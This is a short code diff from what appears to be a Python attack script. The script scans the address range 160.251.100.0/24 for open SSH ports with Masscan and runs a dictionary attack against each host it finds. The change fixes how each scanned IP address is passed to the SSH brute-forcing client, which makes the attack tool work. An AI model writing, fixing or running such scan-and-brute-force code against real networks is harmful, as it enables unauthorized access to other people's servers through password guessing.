@@ -8,7 +8,7 @@ if "__main__" == __name__:
     ips = Masscan.scan("160.251.100.0/24", "22", "1000")
 
     for i in ips:
-        ssh_client = SSH_Client(i, "22")
+        ssh_client = SSH_Client(i["ip"], "22")
         ssh_client.dictionary_attack()
 
         if ssh_client.result is not None:
